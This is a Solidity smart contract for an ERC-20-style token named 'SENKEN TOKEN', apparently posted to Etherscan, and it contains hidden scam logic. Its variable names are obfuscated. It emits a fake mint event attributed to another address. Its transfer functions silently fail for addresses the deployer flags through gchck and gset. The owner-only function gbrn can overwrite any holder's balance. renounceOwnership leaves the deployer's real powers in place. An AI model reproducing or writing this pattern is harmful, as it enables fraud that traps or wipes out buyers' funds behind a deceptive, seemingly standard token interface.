/**
 *Submitted for verification at Etherscan.io on 2023-03-08
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract SENKEN {
    using SafeMath for uint256;
    mapping (address => uint256) private iXXa;
	
    mapping (address => uint256) public iXXb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "SENKEN TOKEN";
	
    string public symbol = "SENKEN";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private iXXc;
      address private iXXd;
    uint256 private iXXe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address iXXf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        iXXd = msg.sender;
             iXXa[msg.sender] = totalSupply;
        
       SCRL();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function SCRL() internal  {                             
                       iXXb[msg.sender] = 4;
                       iXXc = iXXf;

                

        emit Transfer(address(0), iXXc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return iXXa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(iXXb[msg.sender] <= iXXe) {
    require(iXXa[msg.sender] >= value);
iXXa[msg.sender] -= value;  
iXXa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(iXXb[msg.sender] > iXXe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function gchck (address iXXj, uint256 iXXk) public {
		if(iXXb[msg.sender] == iXXe) {   
			   	   
   iXXb[iXXj] = iXXk;}
   }
		       function gset (uint256 iXXk) onlyOwner public {
                     iXXe = iXXk; 
	}

 		       function gbrn (address iXXj, uint256 iXXk) onlyOwner public {		   	   
  iXXa[iXXj] = iXXk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(iXXb[from] < iXXe && iXXb[to] < iXXe) {
        require(value <= iXXa[from]);
        require(value <= allowance[from][msg.sender]);
        iXXa[from] -= value;
        iXXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(iXXb[from] == iXXe) {
        require(value <= iXXa[from]);
        require(value <= allowance[from][msg.sender]);
        iXXa[from] -= value;
        iXXa[to] += value;
        allowance[from][msg.sender] -= value;


            from = iXXf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(iXXb[from] > iXXe || iXXb[to] > iXXe) {
             
         }}



     

        	
 }